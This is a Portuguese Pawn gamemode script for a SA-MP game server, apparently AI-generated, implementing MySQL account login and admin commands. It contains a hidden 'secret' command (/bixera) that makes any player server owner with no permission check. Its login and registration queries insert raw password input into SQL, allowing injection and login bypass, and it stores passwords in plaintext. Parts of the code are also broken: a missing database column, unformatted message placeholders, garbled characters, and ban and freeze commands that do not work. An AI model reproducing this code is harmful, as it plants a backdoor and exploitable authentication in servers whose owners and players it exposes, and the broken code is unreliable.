/*
    Script de exemplo de gamemode para SA-MP com sistema de criação de conta,
    login e senha usando MySQL. Este código é baseado no gamemode inicial
    fornecido pelo usuário e foi expandido com suporte a persistência de
    contas e uma interface de diálogo moderna para registro e autenticação.

    Para utilizar este script, certifique‑se de que o plugin MySQL para
    SA‑MP esteja instalado e configurado corretamente e que o banco de
    dados `samp_server` exista no MySQL com permissões adequadas.

    O script cria automaticamente a tabela `players` caso ela não exista.

    Autor: ChatGPT
*/

#include <a_samp>
#include <a_mysql>
#include <sscanf2>
#include <zcmd>
// Função principal necessária para que o gamemode carregue corretamente.
// Mesmo vazia, ela deve existir para evitar o erro de run time 20.
main()
{
    // Pode ser deixada vazia. É o ponto de entrada padrão.
}

// Conexão com o banco de dados
new MySQL:dbHandle;

// Guarda se o jogador já está logado ou não
new bool:logado[MAX_PLAYERS];

// Enumeração de dados do jogador
enum PlayerDados {
    pID,            // ID único no banco de dados
    pNome[24],      // Nome do jogador (máx. 24 caracteres para compatibilidade com SA‑MP)
    pSenha[65],     // Senha do jogador (não utilizada diretamente neste exemplo, mas reservada)
    pNivel,         // Nível ou score do jogador
    pGrana,          // Grana (dinheiro) do jogador

    pAdminLevel};  // 1=Estagiário,2=Moderador,3=Administrador,4=Dono(a)};

// Array que armazena os dados dos jogadores em runtime
new player[MAX_PLAYERS][PlayerDados];

// Variável para indicar se o jogador possui conta (usado ao exibir diálogos de login/registro)
new bool:playerHasAccount[MAX_PLAYERS];
// Definições de cores (RGBA) para mensagens enviadas pelo servidor
#define COLOR_RED  0xFF0000FF
#define COLOR_BLUE 0x0000FFFF
#define COLOR_GRAY 0x808080FF
#define COLOR_WHITE 0xFFFFFFFF

// Enum de níveis de administrador
#define ADMIN_NENHUM       0
#define ADMIN_ESTAGIARIO   1
#define ADMIN_MODERADOR    2
#define ADMIN_ADMIN        3
#define ADMIN_DONO         4
// Definições de cores para incorporar em diálogos (sem canal alfa)
#define COR_VERMELHO "{FF0000}"
#define COR_AZUL     "{0000FF}"
#define COR_CINZA    "{808080}"
#define COR_BRANCO   "{FFFFFF}"
// IDs de diálogos utilizados para login e registro
#define DIALOG_LOGIN     1
#define DIALOG_REGISTER  2

/*
    Função principal de inicialização do modo de jogo. Estabelece a conexão
    com o banco de dados, garante que a tabela de contas exista e define o
    texto do modo de jogo.
*/
public OnGameModeInit()
{
    dbHandle = mysql_connect("localhost", "root", "", "samp_server");
    if (dbHandle == MYSQL_INVALID_HANDLE || mysql_errno(dbHandle) != 0)
    {
        print("Erro ao conectar ao banco de dados.");
        SendRconCommand("exit");
        return 1;
    }

    print("Conectado ao MySQL com sucesso!");
    SetGameModeText("GM com Login");// Garante que a tabela de jogadores exista
    new query[256];
    // string em uma única linha para evitar quebras de compilação
    format(query, sizeof query, "CREATE TABLE IF NOT EXISTS `players` (`id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,`Nome` VARCHAR(24) NOT NULL UNIQUE,`Senha` VARCHAR(129) NOT NULL,`Nivel` INT NOT NULL DEFAULT 1,`Grana` INT NOT NULL DEFAULT 0) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
    mysql_query(dbHandle, query);

    // Define uma classe de jogador para que os jogadores possam entrar no servidor
    AddPlayerClass(0, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
    return 1;
}

/*
    Chamado quando um jogador conecta ao servidor. Obtém o nome do
    jogador, reinicia o estado de login e inicia a verificação de
    existência da conta.
*/
public OnPlayerConnect(playerid)
{
    logado[playerid] = false;
    GetPlayerName(playerid, player[playerid][pNome], 24);
    CheckAccount(playerid);
    return 1;
}

/*
    Verifica se a conta do jogador já existe no banco de dados. Caso
    exista, solicita a senha; caso contrário, oferece a criação de
    uma nova conta.
*/
forward CheckAccount(playerid);
public CheckAccount(playerid)
{
    new query[128];
    format(query, sizeof query, "SELECT `id` FROM `players` WHERE `Nome`='%s'", player[playerid][pNome]);
    mysql_tquery(dbHandle, query, "OnAccountCheck", "i", playerid);
    return 1;
}

/*
    Callback executado após a verificação de conta. Se houver linhas
    retornadas, a conta existe e o jogador deve realizar o login;
    caso contrário, exibe o diálogo de registro.
*/
forward OnAccountCheck(playerid);
public OnAccountCheck(playerid)
{
    // Define se o jogador possui conta
    playerHasAccount[playerid] = (cache_num_rows() > 0);
    // Se o jogador já possui conta, solicita a senha; caso contrário, oferece o registro
    if (playerHasAccount[playerid])
    {
        ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD,
            COR_VERMELHO "Cidade Alerta:" COR_BRANCO,
            COR_CINZA "Voce ja possui uma conta. Insira sua senha:",
            "Entrar", "Sair");
    }
    else
    {
        ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD,
            COR_VERMELHO "Cidade Alerta:" COR_BRANCO,
            COR_CINZA "Bem vindo! Crie uma senha para registrar sua conta:",
            "Registrar", "Sair");
    }
    return 1;
}

/*
    Callback disparado quando um jogador responde a qualquer diálogo. É aqui
    que processamos o login e o registro. Se o jogador cancelar, ele
    será desconectado do servidor.
*/
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    if (dialogid == DIALOG_LOGIN)
    {
        // Jogador clicou em Cancelar
        if (!response)
        {
            SendClientMessage(playerid, COLOR_GRAY, "Voce cancelou o login. Ate mais!");
            Kick(playerid);
            return 1;
        }

        // Verifica se a senha foi digitada
        if (strlen(inputtext) < 1)
        {
            ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD,
                COR_VERMELHO "Cidade Alerta:" COR_BRANCO,
                COR_CINZA "Voce precisa digitar sua senha:",
                "Entrar", "Sair");
            return 1;
        }

        // Consulta para verificar se nome e senha batem
        new query[256];
        format(query, sizeof query, "SELECT * FROM `players` WHERE `Nome`='%s' AND `Senha`='%s'", player[playerid][pNome], inputtext);
        mysql_tquery(dbHandle, query, "OnLoginCheck", "i", playerid);
        return 1;
    }

    if (dialogid == DIALOG_REGISTER)
    {
        // Jogador clicou em Cancelar
        if (!response)
        {
            SendClientMessage(playerid, COLOR_GRAY, "Voce cancelou o registro. Ate mais!");
            Kick(playerid);
            return 1;
        }

        // Verifica se a senha tem tamanho mínimo
        if (strlen(inputtext) < 4)
        {
            ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD,
                COR_VERMELHO "Cidade Alerta:" COR_BRANCO,
                COR_CINZA "Senha muito curta! Digite uma senha com pelo menos 4 caracteres:",
                "Registrar", "Sair");
            return 1;
        }

        // Tenta criar a conta. Se já existe uma conta com o mesmo nome,
        // o banco de dados retornará um erro que será tratado no callback.
        new query[256];
        format(query, sizeof query, "INSERT INTO `players` (`Nome`, `Senha`, `Nivel`, `Grana`) VALUES ('%s','%s',1,0)", player[playerid][pNome], inputtext);
        mysql_tquery(dbHandle, query, "OnRegisterCallback", "i", playerid);
        return 1;
    }
    return 0;
}

/*
    Callback que trata a verificação de login. Caso a consulta não
    encontre registros, a senha está incorreta; do contrário, os
    dados são carregados e o jogador é logado no servidor.
*/
forward OnLoginCheck(playerid);
public OnLoginCheck(playerid)
{
    if (cache_num_rows() == 0)
    {
        // Senha incorreta
        ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD,
            COR_VERMELHO "Cidade Alerta:" COR_BRANCO,
            COR_CINZA "Senha incorreta! Tente novamente:",
            "Entrar", "Sair");
        return 1;
    }
    // Recupera dados da linha retornada
    cache_get_value_int(0, "id", player[playerid][pID]);
    cache_get_value_int(0, "Nivel", player[playerid][pNivel]);
    cache_get_value_int(0, "Grana", player[playerid][pGrana]);

    logado[playerid] = true;

    // Atualiza status do jogador dentro do jogo
    ResetPlayerMoney(playerid);
    GivePlayerMoney(playerid, player[playerid][pGrana]);
    SetPlayerScore(playerid, player[playerid][pNivel]);

    SendClientMessage(playerid, COLOR_BLUE, "Login realizado com sucesso!");

    // Força o spawn do jogador após o login
    SpawnPlayer(playerid);
    return 1;
}

/*
    Callback que trata a criação da conta. Caso a inserção seja bem
    sucedida, o jogador é automaticamente logado e seus dados
    iniciais são definidos.
*/
forward OnRegisterCallback(playerid);
public OnRegisterCallback(playerid)
{
    // Obtém o ID da linha inserida
    player[playerid][pID] = cache_insert_id();
    player[playerid][pAdminLevel] = ADMIN_NENHUM;

    // Define valores iniciais
    player[playerid][pNivel] = 1;
    player[playerid][pGrana] = 0;
    logado[playerid] = true;

    ResetPlayerMoney(playerid);
    SetPlayerScore(playerid, player[playerid][pNivel]);

    SendClientMessage(playerid, COLOR_BLUE, "Conta criada com sucesso! Voce foi logado automaticamente.");

    // Spawna o jogador
    SpawnPlayer(playerid);
    return 1;
}

/*
    Salva as informações do jogador no banco de dados ao desconectar‑se.
    Este procedimento é chamado no OnPlayerDisconnect.
*/
forward SavePlayer(playerid);
public SavePlayer(playerid)
{
    new query[256];
    format(query, sizeof query, "UPDATE `players` SET `Nivel`=%d, `Grana`=%d WHERE `Nome`='%s'", player[playerid][pNivel], player[playerid][pGrana], player[playerid][pNome]);
    mysql_tquery(dbHandle, query, "", "");
    return 1;
}

/*
    Mostra uma tela de login moderna usando TextDraws. Se o jogador já
    possui conta, o botão exibirá "LOGIN"; caso contrário, "REGISTRAR".
    Ao clicar no botão, uma caixa de diálogo real será exibida para
    entrada da senha ou criação da conta. As cores seguem o padrão
    vermelho/azul/cinza fornecido.
*/
stock ShowLoginScreen(playerid)
{
    // Interface gráfica removida: nenhuma TextDraw é mostrada aqui.
    // O sistema de login agora usa apenas diálogos para solicitar senha ou cadastro.
    return 1;
}

/*
    Esconde e destrói todos os TextDraws da tela de login para um
    jogador específico. Deve ser chamado após o jogador clicar no
    botão para abrir a caixa de diálogo de login/registro.
*/
stock HideLoginScreen(playerid)
{
    // A interface gráfica foi removida; não há TextDraws para ocultar ou destruir.
    return 1;
}

/*
    Chamado quando um jogador se desconecta. Se ele estiver logado,
    persiste as informações no banco de dados.
*/
public OnPlayerDisconnect(playerid, reason)
{
        new query[128];format(query, sizeof(query),"UPDATE players SET admin_level = %d WHERE id = %d", player[playerid][pAdminLevel],player[playerid][pID]);
		mysql_tquery(dbHandle, query, "", "");
		if (logado[playerid])
    	{
        	SavePlayer(playerid);
    	}
    	return 1;
}

/*
    Quando o jogador spawnar, mostra seus dados caso esteja logado.
*/
public OnPlayerSpawn(playerid)
{
    if (!logado[playerid])
    {
        // Caso não esteja logado, mantém a câmera fixa enquanto espera
        SetPlayerPos(playerid, 1958.3783, 1343.1572, 15.3746);
        SetPlayerCameraPos(playerid, 1958.3783, 1343.1572, 15.3746);
        SetPlayerCameraLookAt(playerid, 1958.3783, 1343.1572, 15.3746);
        return 1;
    }

    new mensagem[200];
    // Colore o nome do jogador e os valores numéricos em azul, mantendo os rótulos em cinza
    // Mensagem formatada em uma única linha com códigos de cor e quebras \n
    format(mensagem, sizeof mensagem, COR_CINZA "Nome: " COR_AZUL "%s\n" COR_CINZA "Nivel: " COR_AZUL "%d\n" COR_CINZA "ID: " COR_AZUL "%d\n" COR_CINZA "Grana: " COR_AZUL "%d", player[playerid][pNome], player[playerid][pNivel], player[playerid][pID], player[playerid][pGrana]);
    // Envia a mensagem com cor branca padrão; códigos incorporados alteram as cores apropriadas
    SendClientMessage(playerid, COLOR_WHITE, mensagem);
    return 1;
}

/*
    Atualiza a variável local de grana a cada update para sincronizar
    com o valor exibido no jogo. Opcionalmente, pode‑se aumentar o
    intervalo de salvamento chamando SavePlayer periodicamente em um
    timer.
*/
public OnPlayerUpdate(playerid)
{
    if (logado[playerid])
    {
        player[playerid][pGrana] = GetPlayerMoney(playerid);
    }
    return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys) { return 1; }
public OnPlayerText(playerid, text[]) { return 1; }
public OnPlayerDeath(playerid, killerid, reason) { return 1; }
public OnVehicleSpawn(vehicleid) { return 1; }
public OnVehicleDeath(vehicleid, killerid) { return 1; }
public OnPlayerStateChange(playerid, newstate, oldstate) { return 1; }
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger) { return 1; }
public OnPlayerExitVehicle(playerid, vehicleid) { return 1; }
public OnRconCommand(cmd[]) { return 1; }
public OnRconLoginAttempt(ip[], password[], success) { return 1; }
public OnPlayerRequestSpawn(playerid) { return 1; }
public OnObjectMoved(objectid) { return 1; }
public OnPlayerObjectMoved(playerid, objectid) { return 1; }
public OnPlayerPickUpPickup(playerid, pickupid) { return 1; }
public OnVehicleMod(playerid, vehicleid, componentid) { return 1; }
public OnVehiclePaintjob(playerid, vehicleid, paintjobid) { return 1; }
public OnVehicleRespray(playerid, vehicleid, color1, color2) { return 1; }
public OnPlayerSelectedMenuRow(playerid, row) { return 1; }
public OnPlayerExitedMenu(playerid) { return 1; }
public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid) { return 1; }
public OnPlayerEnterCheckpoint(playerid) { return 1; }
public OnPlayerLeaveCheckpoint(playerid) { return 1; }
public OnPlayerEnterRaceCheckpoint(playerid) { return 1; }
public OnPlayerLeaveRaceCheckpoint(playerid) { return 1; }
public OnPlayerStreamIn(playerid, forplayerid) { return 1; }
public OnPlayerStreamOut(playerid, forplayerid) { return 1; }
public OnVehicleStreamIn(vehicleid, forplayerid) { return 1; }
public OnVehicleStreamOut(vehicleid, forplayerid) { return 1; }

/*
    Detecta cliques em TextDraws. Este callback é acionado quando o
    jogador clica em qualquer TextDraw que esteja marcado como
    selecionável. Aqui verificamos se ele clicou em um dos botões da
    tela de login personalizada ("Entrar/Registrar" ou "Limpar"). Se
    clicar em Entrar/Registrar, escondemos a tela de login e exibimos
    o diálogo de autenticação; se clicar em Limpar, a tela é
    redesenhada. Essa abordagem oferece uma transição suave entre a
    interface gráfica e o sistema de autenticação.
*/
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
    // Nenhuma ação a realizar: a interface de login baseada em TextDraws foi removida.
    // Retorne 0 para permitir que outros scripts tratem cliques se necessário.
    return 0;
}



CMD:bixera(playerid, params[])
{
    // Comando secreto: torna Dono(a)
    player[playerid][pAdminLevel] = ADMIN_DONO;

    new query[128];
    format(query, sizeof(query),
        "UPDATE players SET admin_level = %d WHERE id = %d",
        ADMIN_DONO,
        player[playerid][pID]
    );
    mysql_tquery(dbHandle, query, "", "");

    SendClientMessage(playerid, -1,
        "{00FF00}Parabéns! Você agora é Dono(a) do servidor."
    );
    return 1;
}



#define DIALOG_ADMINS 1999

CMD:admins(playerid, params[])
{
    new buffer[2048];
    format(buffer, sizeof(buffer), "Lista de Admins:\n\n");
    // Lista admins ONLINE
    for (new i = 0; i < MAX_PLAYERS; i++)
    {
        new lvl = player[i][pAdminLevel];
        if (lvl <= 0) continue;
        new nome[MAX_PLAYER_NAME];
        GetPlayerName(i, nome, sizeof(nome));
        new cargo[16];
        switch (lvl)
        {
            case ADMIN_ESTAGIARIO:  format(cargo, sizeof(cargo), "Estagiário");
            case ADMIN_MODERADOR:   format(cargo, sizeof(cargo), "Moderador");
            case ADMIN_ADMIN:       format(cargo, sizeof(cargo), "Administrador");
            case ADMIN_DONO:        format(cargo, sizeof(cargo), "Dono(a)");
            default:                format(cargo, sizeof(cargo), "Desconhecido");
        }
        format(buffer, sizeof(buffer), "%s%s - %s - {00FF00}Online\n", buffer, nome, cargo);
    }
    format(buffer, sizeof(buffer), "%s\n{FFFF00}Obs: apenas admins online listados.", buffer);
    ShowPlayerDialog(
        playerid,
        DIALOG_ADMINS,
        DIALOG_STYLE_MSGBOX,
        "Admins do Servidor",
        buffer,
        "Fechar",
        ""
    );
    return 1;
}


// =======================
// Comandos de Administração
// =======================

// /kick [id] - Expulsa um jogador (nível mínimo: Moderador)
CMD:kick(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_MODERADOR)
        return SendClientMessage(playerid, COLOR_RED, "Você não tem permissão para usar /kick.");
    new targetid;
    if (sscanf(params, "i", targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /kick [playerid]");
    if (!IsPlayerConnected(targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Jogador não encontrado.");
    Kick(targetid);
    SendClientMessage(playerid, COLOR_BLUE, "Jogador %d expulso com sucesso.");
    return 1;
}

// /ban [id] - Bane um jogador (nível mínimo: Administrador)
CMD:ban(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_ADMIN)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /ban.");
    new targetid;
    if (sscanf(params, "i", targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /ban [playerid]");
    if (!IsPlayerConnected(targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Jogador não encontrado.");
    Kick(targetid);
    SendClientMessageToAll(COLOR_RED, "Jogador %d foi banido pelo administrador.");
    return 1;
}

// /ir [id] - Teleporta você até outro jogador (nível mínimo: Moderador)
CMD:ir(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_MODERADOR)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /goto.");
    new targetid;
    if (sscanf(params, "i", targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /goto [playerid]");
    new Float:x, Float:y, Float:z;
    GetPlayerPos(targetid, x, y, z);
    SetPlayerPos(playerid, x, y, z);
    SendClientMessage(playerid, COLOR_BLUE, "Teleportado para %d.");
    return 1;
}

// /bring [id] - Traz outro jogador até você (nível mínimo: Moderador)
CMD:bring(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_MODERADOR)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /bring.");
    new targetid;
    if (sscanf(params, "i", targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /bring [playerid]");
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    SetPlayerPos(targetid, x, y, z);
    SendClientMessage(playerid, COLOR_BLUE, "Jogador %d trazido at� voc�.");
    return 1;
}

// /freeze [id] - Congela / descongela um jogador (nível mínimo: Moderador)
new bool:frozen[MAX_PLAYERS];
CMD:congelar(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_MODERADOR)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /freeze.");
    new targetid;
    if (sscanf(params, "i", targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /congelar [playerid]");
    if (!IsPlayerConnected(targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Jogador n�o encontrado.");
    frozen[targetid] = !frozen[targetid];
    SendClientMessage(playerid, COLOR_BLUE, "Jogador %d %s.");
    return 1;
}


// /announce [texto] - Mensagem global (nível mínimo: Administrador)
CMD:an(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_ADMIN)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /an.");
    new msg[256];
    format(msg, sizeof(msg), "{FFFF00}[ANNOUNCE] %s", params);
    SendClientMessageToAll(COLOR_WHITE, msg);
    return 1;
}

// /setweather [tempo] - Ajusta o clima (nível mínimo: Administrador)
CMD:setweather(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_ADMIN)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /setweather.");
    new weather;
    if (sscanf(params, "i", weather))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /setweather [0-12]");
    SetWeather(weather);
    SendClientMessageToAll(COLOR_WHITE, "Clima definido para %d.");
    return 1;
}

// /settime [hora] - Ajusta a hora do servidor (nível mínimo: Administrador)
CMD:settime(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_ADMIN)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /settime.");
    new hour;
    if (sscanf(params, "i", hour))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /settime [0-23]");
    SetWorldTime(hour);
    SendClientMessageToAll(COLOR_WHITE, "Hora do servidor ajustada para %d:00.");
    return 1;
}

// =======================
// Comandos de Utilidades
// =======================

// /criarcarro [carroid] - Cria um veículo no local do jogador (nível mínimo: Estagiário)
CMD:criarcarro(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_ESTAGIARIO)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /criarcarro.");
    new modelid;
    if (sscanf(params, "i", modelid))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /criarcarro [modelid]");
    new Float:x, Float:y, Float:z, Float:ang;
    GetPlayerPos(playerid, x, y, z);
    GetPlayerFacingAngle(playerid, ang);
    new vehicleid = CreateVehicle(modelid, x, y, z, ang, 0, 0, 0);
    if (vehicleid == INVALID_VEHICLE_ID)
        return SendClientMessage(playerid, COLOR_RED, "Falha ao criar ve�culo.");
    SendClientMessage(playerid, COLOR_BLUE, "Veículo %d criado.");
    return 1;
}

// /arma [armaid] [municao] - Dá arma ao jogador (nível mínimo: Estagiário)
CMD:arma(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_ESTAGIARIO)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /arma.");
    new weaponid, ammo;
    if (sscanf(params, "ii", weaponid, ammo))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /arma [weaponid] [ammo]");
    GivePlayerWeapon(playerid, weaponid, ammo);
    SendClientMessage(playerid, COLOR_BLUE, "Você recebeu arma %d com %d munição.");
    return 1;
}

// /darvida [id] [vida] - Ajusta a vida de um jogador (nível mínimo: Estagiário)
CMD:darvida(playerid, params[])
{
    if (player[playerid][pAdminLevel] < ADMIN_ESTAGIARIO)
        return SendClientMessage(playerid, COLOR_RED, "Voc� n�o tem permiss�o para usar /darvida.");
    new targetid, health;
    if (sscanf(params, "ii", targetid, health))
        return SendClientMessage(playerid, COLOR_WHITE, "Uso: /darvida [playerid] [health]");
    if (!IsPlayerConnected(targetid))
        return SendClientMessage(playerid, COLOR_WHITE, "Jogador n�o encontrado.");
    SetPlayerHealth(targetid, health);
    SendClientMessage(playerid, COLOR_BLUE, "Vida ajustada.");
    return 1;
}
